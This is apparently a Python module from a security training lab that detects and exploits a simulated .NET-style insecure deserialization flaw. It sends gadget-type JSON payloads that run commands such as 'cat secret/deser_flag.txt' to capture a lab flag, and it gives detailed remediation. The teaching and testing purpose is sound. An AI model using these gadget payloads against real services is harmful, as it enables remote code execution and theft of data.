"""Insecure (.NET-style) deserialization -> remote code execution.

WHAT IT IS
----------
The demo app exposes an import endpoint at ``POST /api/import`` that accepts a
JSON document carrying a **type discriminator** -- a ``__type`` field that names
the CLR type the server should reconstruct from the wire data::

    def _api_import(h):                              // POST /api/import
        blob = h.body_bytes().decode()
        result = deserialize(blob, h.state.sandbox)  // VULN: type comes from input
        return 200 result

    def deserialize(blob, sandbox):
        data = json.loads(blob)
        type_name = data.get("__type", "")
        if type_name in GADGET_TYPES:                // attacker-chosen TYPE
            command = data.get("command") or ...
            output = simulate_shell(command, sandbox)   // construction side-effect == RCE
            return {..., "output": output, "rce": True}
        # benign type: reconstruct as plain data, no instantiation
        return {..., "data": {k: v for k, v in data.items() if k != "__type"}}

A benign document such as ``{"__type":"User","name":"x"}`` is harmless: it is
reconstructed as plain data (``{"data": {"name": "x"}}``) and no type is ever
instantiated. The flaw is that the *deserializer trusts the wire to pick the
type*. When the document names a **gadget type** -- a type whose construction or
initialisation has an exploitable side effect -- "load this object" becomes
"run this code". Here the gadget is::

    {"__type":"System.Diagnostics.Process","command":"cat secret/deser_flag.txt"}

Reconstructing a ``System.Diagnostics.Process`` (and friends:
``System.Windows.Data.ObjectDataProvider``,
``System.Configuration.Install.AssemblyInstaller``) runs the attacker's command
through the (simulated) shell. The response's ``output`` field then contains
:data:`C.FLAGS["dotnet_deserialization"]` -- proof of RCE.

REAL-WORLD EQUIVALENTS (.NET)
-----------------------------
The lab models the JSON discriminator as a faithful stand-in for the .NET
deserializers that are dangerous precisely because they embed/honour type
information from the byte stream:

* **BinaryFormatter / SoapFormatter / NetDataContractSerializer** -- the type to
  instantiate is read straight from the serialized bytes. ``BinaryFormatter`` is
  unfixable-by-design and is deprecated/removed in modern .NET; Microsoft's
  guidance is to stop using it entirely.
* **LosFormatter / ObjectStateFormatter** -- the ASP.NET ``__VIEWSTATE`` /
  ``EventValidation`` machinery. With a known/empty ``MachineKey`` an attacker
  forges a ViewState whose deserialization runs a gadget (the
  ``ysoserial.net`` ``TypeConfuseDelegate`` / ``ActivitySurrogateSelector``
  chains target exactly this).
* **Json.NET (Newtonsoft.Json) with ``TypeNameHandling.Auto`` /
  ``TypeNameHandling.All``** -- this is the closest analogue to the lab: the
  ``"$type"`` field in the JSON tells the deserializer which CLR type to build,
  so ``"$type":"System.Windows.Data.ObjectDataProvider, ..."`` constructs an
  ``ObjectDataProvider`` gadget that invokes ``Process.Start``. (The lab uses
  ``__type``; real Json.NET uses ``$type``.)
* **DataContractJsonSerializer / JavaScriptSerializer (with a permissive
  ``JavaScriptTypeResolver``) / XmlSerializer with an attacker-influenced root
  type / fastJSON / FsPickler** -- all share the same root cause: the *type* is
  attacker-controlled, and some reachable type is a gadget.

The canonical gadgets (``ObjectDataProvider``, ``Process``/``ProcessStartInfo``,
``AssemblyInstaller``, ``WindowsIdentity``, delegate-serialization chains) are
catalogued and weaponised by ``ysoserial.net``.

HOW WE DISCOVER IT
------------------
Two differential signals confirm a real, exploitable type-confusion RCE (not an
endpoint that simply echoes input or runs everything):

1.  **A benign type round-trips as inert DATA (the control).** ``POST
    /api/import`` with ``{"__type":"User","name":"weblab-probe"}`` returns 200
    with the value reconstructed under ``data`` and **no** ``rce``/``output``
    field -- proof the deserializer treats an unknown/benign type as plain data,
    so executing a gadget is a genuine escalation, not "it runs everything".
2.  **A gadget type triggers code execution (the bug).** ``POST /api/import``
    with the ``System.Diagnostics.Process`` discriminator and a probe command
    (``echo <nonce>``) returns 200 with ``rce: true`` and an ``output`` that
    contains our unique nonce -- proof the attacker-named type's construction
    actually executed our command server-side.

HOW WE EXPLOIT IT
-----------------
We send the weaponised gadget document -- ``{"__type":
"System.Diagnostics.Process", "command": "cat secret/deser_flag.txt"}`` -- as a
raw JSON body via ``post(body=json.dumps(...).encode())`` and scrape the
``output`` field, recovering :data:`C.FLAGS["dotnet_deserialization"]` straight
out of the RCE. (We also try the other gadget types so the report shows the
whole gadget surface; the first that yields the flag wins.)

THE FIX
-------
See :data:`REMEDIATION`. In one line: never let the serialized data choose the
type -- drop ``BinaryFormatter``/``LosFormatter``, set Json.NET
``TypeNameHandling = None`` (or pin a strict allow-list ``SerializationBinder``),
deserialize into a fixed, known DTO, and treat deserialization input as
untrusted.
"""
from __future__ import annotations

import json
from typing import Any, Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Insecure deserialization is RCE when the serialized data is allowed to "
    "choose which TYPE gets instantiated (a 'type discriminator' / type-name "
    "handling). FIX, in order of preference: (1) DO NOT deserialize untrusted "
    "input into arbitrary types. Abandon the dangerous .NET formatters that "
    "embed type info in the stream -- BinaryFormatter (deprecated/removed in "
    "modern .NET; unfixable by design), SoapFormatter, NetDataContractSerializer, "
    "LosFormatter/ObjectStateFormatter (ASP.NET ViewState); use a "
    "data-only/contract serializer (System.Text.Json, DataContractSerializer with "
    "a known root type, protobuf) that maps the bytes onto a FIXED, "
    "pre-declared DTO and never instantiates a type named by the input. "
    "(2) For Json.NET (Newtonsoft.Json), set TypeNameHandling = None (the "
    "default) -- never Auto/All/Objects -- so '$type' in the JSON is ignored; "
    "if polymorphism is truly required, supply a strict custom SerializationBinder "
    "that allow-lists ONLY the exact expected types (deny by default) and reject "
    "everything else (Process, ObjectDataProvider, AssemblyInstaller, "
    "WindowsIdentity, delegate/surrogate gadgets, anything System.* you did not "
    "explicitly permit). (3) Protect ASP.NET ViewState: keep a strong, secret, "
    "per-app MachineKey, enable ViewStateMac/EnableViewStateMac and encryption, "
    "and never deserialize ViewState/EventValidation that fails its MAC. "
    "(4) Validate the decoded object AFTER binding to a known type (schema/shape "
    "checks), run the deserializer at least privilege, and monitor/alert on "
    "deserialization of unexpected types. The root cause is identical across "
    "stacks (Java ObjectInputStream/Jackson default typing, Python pickle/PyYAML "
    "yaml.load, PHP unserialize, Ruby Marshal): treat the byte stream as untrusted "
    "and never let it select the type that gets constructed."
)

#: The vulnerable import endpoint (deserializes a JSON document whose ``__type``
#: discriminator selects the type to reconstruct -- attacker-controlled).
ENDPOINT: str = "/api/import"

#: The wire-format field naming the type to reconstruct (the lab uses
#: ``__type``; real Json.NET uses ``$type``).
TYPE_FIELD: str = "__type"

#: The command field a gadget executes (``command``; the deserializer also
#: accepts ``MethodParameters`` as Json.NET's ObjectDataProvider chain would).
COMMAND_FIELD: str = "command"

#: A BENIGN type used as the control: it is reconstructed as plain data, never
#: instantiated, so its response carries NO ``rce``/``output`` -- proving that a
#: gadget is a real escalation rather than "the endpoint runs everything".
BENIGN_TYPE: str = "User"

#: The .NET gadget types whose (simulated) construction executes a command --
#: the real-world OSWE chains: the ObjectDataProvider -> Process.Start gadget,
#: the Process/ProcessStartInfo gadget, and the AssemblyInstaller activator.
GADGET_TYPES: List[str] = [
    "System.Diagnostics.Process",
    "System.Windows.Data.ObjectDataProvider",
    "System.Configuration.Install.AssemblyInstaller",
]

#: The command the weaponised gadget runs to recover the flag.
FLAG_COMMAND: str = "cat secret/deser_flag.txt"

#: A harmless probe command used during DETECTION: a gadget that echoes our
#: unique nonce proves code executed without reading any secret yet.
PROBE_NONCE: str = "weblab-deser-rce-probe"
PROBE_COMMAND: str = f"echo {PROBE_NONCE}"

#: Everything the engine submits, as raw JSON strings (public so the CLI/report
#: can show exactly what was tried): the benign control, an ``echo``-nonce probe
#: gadget, and the weaponised ``cat`` gadget for each gadget type.
PAYLOADS: List[str] = (
    [json.dumps({TYPE_FIELD: BENIGN_TYPE, "name": "weblab-probe"})]
    + [json.dumps({TYPE_FIELD: GADGET_TYPES[0], COMMAND_FIELD: PROBE_COMMAND})]
    + [json.dumps({TYPE_FIELD: gtype, COMMAND_FIELD: FLAG_COMMAND}) for gtype in GADGET_TYPES]
)


# --- low-level probe ---------------------------------------------------------
def _import(client: WebClient, document: Dict[str, Any]) -> Response:
    """Drive the deserialization sink: ``POST /api/import`` with a raw JSON body.

    The document is serialized and sent via ``post(body=...)`` -- exactly how a
    .NET client would PUT a serialized object on the wire, so the server's
    deserializer (not our HTTP layer) chooses the type from ``__type``.
    """
    return client.post(ENDPOINT, body=json.dumps(document).encode())


def _result_json(resp: Response) -> Dict[str, Any]:
    """Decode the import response to a dict (empty dict on any decode failure)."""
    if resp.status != 200:
        return {}
    try:
        body = resp.json()
    except ValueError:
        return {}
    return body if isinstance(body, dict) else {}


def _executed_output(resp: Response) -> Optional[str]:
    """Return the gadget's command output iff this response performed RCE.

    A real RCE response carries ``rce: true`` and an ``output`` field; a benign
    reconstruction does not. Returns the ``output`` string, or ``None`` if the
    response did not execute a command.
    """
    body = _result_json(resp)
    if body.get("rce") is True and "output" in body:
        return str(body.get("output", ""))
    return None


# --- detection ---------------------------------------------------------------
def detect_benign_type_is_inert(client: WebClient) -> Tuple[bool, str]:
    """Control: a benign ``__type`` round-trips as inert DATA, never executing.

    ``POST /api/import`` with ``{"__type":"User","name":...}`` returns 200 with
    the value under ``data`` and NO ``rce``/``output`` -- proof the deserializer
    treats a non-gadget type as plain data, so a gadget firing is a genuine
    escalation rather than "this endpoint runs everything it receives".
    """
    document = {TYPE_FIELD: BENIGN_TYPE, "name": "weblab-probe"}
    resp = _import(client, document)
    body = _result_json(resp)
    if (
        resp.status == 200
        and _executed_output(resp) is None
        and body.get("rce") is not True
        and isinstance(body.get("data"), dict)
        and body["data"].get("name") == "weblab-probe"
    ):
        return True, (
            f"POST {ENDPOINT} {{\"{TYPE_FIELD}\":\"{BENIGN_TYPE}\",...}} (a benign "
            f"type) was reconstructed as inert DATA (HTTP {resp.status}, "
            f"data={body['data']!r}, no rce/output) -- non-gadget types do not execute"
        )
    return False, ""


def detect_gadget_executes(client: WebClient) -> Tuple[bool, str]:
    """Bug: a gadget ``__type`` executes a probe command (echoed nonce proves RCE).

    ``POST /api/import`` with ``{"__type":"System.Diagnostics.Process",
    "command":"echo <nonce>"}`` returns 200 with ``rce: true`` and an ``output``
    that contains our unique nonce -- proof that naming a gadget type ran our
    command server-side, i.e. deserialization -> code execution.
    """
    document = {TYPE_FIELD: GADGET_TYPES[0], COMMAND_FIELD: PROBE_COMMAND}
    resp = _import(client, document)
    output = _executed_output(resp)
    if output is not None and PROBE_NONCE in output:
        return True, (
            f"POST {ENDPOINT} {{\"{TYPE_FIELD}\":\"{GADGET_TYPES[0]}\","
            f"\"{COMMAND_FIELD}\":\"{PROBE_COMMAND}\"}} executed (HTTP "
            f"{resp.status}, rce=true) and echoed our nonce -> output={output!r} "
            f"-- the attacker-named gadget TYPE ran our command (RCE)"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def exploit_deserialization_rce(
    client: WebClient,
) -> Tuple[bool, Optional[str], List[Dict[str, str]]]:
    """Send the weaponised ``cat`` gadget for each gadget type; recover the flag.

    Returns ``(ok, flag, attempts)`` where ``attempts`` records each gadget type
    tried with the command, HTTP status, whether it executed, and whether the
    flag was found in its output (for the report); ``flag`` is the recovered
    :data:`C.FLAGS["dotnet_deserialization"]` scraped from the gadget's
    ``output`` field.
    """
    attempts: List[Dict[str, str]] = []
    flag: Optional[str] = None
    for gtype in GADGET_TYPES:
        document = {TYPE_FIELD: gtype, COMMAND_FIELD: FLAG_COMMAND}
        resp = _import(client, document)
        output = _executed_output(resp)
        got_flag = output is not None and C.FLAGS["dotnet_deserialization"] in output
        if got_flag and flag is None:
            flag = C.FLAGS["dotnet_deserialization"]
        attempts.append(
            {
                "type": gtype,
                "command": FLAG_COMMAND,
                "status": str(resp.status),
                "executed": str(output is not None),
                "flag_in_output": str(got_flag),
            }
        )
    ok = flag == C.FLAGS["dotnet_deserialization"]
    return ok, flag, attempts


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect the insecure-deserialization RCE, then exploit it (recover the flag).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    :data:`C.FLAGS["dotnet_deserialization"]` plus which gadget type executed it,
    with ``extra`` proving the bug was real: a benign ``__type`` round-trips as
    inert data, yet a ``System.Diagnostics.Process`` gadget runs our command and
    a ``cat secret/deser_flag.txt`` gadget returns the flag in its output -- the
    deserializer trusts the wire to pick the type.
    """
    techniques: List[str] = []

    # 1) Detection / controls ----------------------------------------------
    ctrl_ok, ctrl_ev = detect_benign_type_is_inert(client)
    if ctrl_ok:
        techniques.append("benign-type-inert-data")
    rce_ok, rce_ev = detect_gadget_executes(client)
    if rce_ok:
        techniques.append("gadget-type-executes-rce")

    # 2) Exploitation -------------------------------------------------------
    ok, flag, attempts = exploit_deserialization_rce(client)
    if ok:
        techniques.append("recover-flag")

    # Discovery requires the gadget to have executed AND produced the flag AND
    # the benign control to prove a non-gadget type stays inert (so it is a real
    # type-confusion escalation, not an endpoint that runs everything).
    discovered = bool(ok and ctrl_ok and rce_ok)

    executed_types = [a["type"] for a in attempts if a["flag_in_output"] == "True"]
    first_working = executed_types[0] if executed_types else ""

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if ctrl_ok:
        evidence_parts.append(f"control: {ctrl_ev}")
    if rce_ok:
        evidence_parts.append(f"rce: {rce_ev}")
    evidence = " || ".join(evidence_parts)

    gadget_payload = json.dumps({TYPE_FIELD: first_working or GADGET_TYPES[0],
                                 COMMAND_FIELD: FLAG_COMMAND})

    exploit_result = {
        "flag": flag,
        "gadget_type": first_working,
        "endpoint": ENDPOINT,
        "command": FLAG_COMMAND,
        "gadget_payload": gadget_payload,
        "benign_payload": json.dumps({TYPE_FIELD: BENIGN_TYPE, "name": "weblab-probe"}),
        "executed_types": executed_types,
        "attempts": attempts,
        "techniques": techniques,
        "dotnet_note": (
            "The JSON __type discriminator models .NET deserializers that pick "
            "the CLR type from the byte stream: Json.NET TypeNameHandling.Auto "
            "('$type'), BinaryFormatter/SoapFormatter, and LosFormatter/"
            "ObjectStateFormatter (ViewState). The gadget types here "
            "(ObjectDataProvider, Process, AssemblyInstaller) are the "
            "ysoserial.net chains. FIX: TypeNameHandling=None / strict "
            "SerializationBinder allow-list; drop BinaryFormatter/LosFormatter."
        ),
        "summary": (
            f"a benign __type ({BENIGN_TYPE!r}) round-tripped as inert data, but "
            f"the gadget type {first_working!r} executed our command via "
            f"deserialization -> RCE; ran {FLAG_COMMAND!r} and recovered flag "
            f"{flag!r} from POST {ENDPOINT} (body=json.dumps(...).encode())"
        ),
    }

    return Finding(
        vuln="Insecure Deserialization (.NET-style type discriminator -> RCE)",
        endpoint=ENDPOINT,
        severity=Severity.CRITICAL.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=gadget_payload,
        extra={
            "techniques": techniques,
            "benign_type_inert": ctrl_ok,
            "gadget_executed": rce_ok,
            "flag_recovered": ok,
            "executed_types": executed_types,
            "gadget_types": GADGET_TYPES,
            "type_field": TYPE_FIELD,
            "command": FLAG_COMMAND,
            "attempts": attempts,
        },
    )
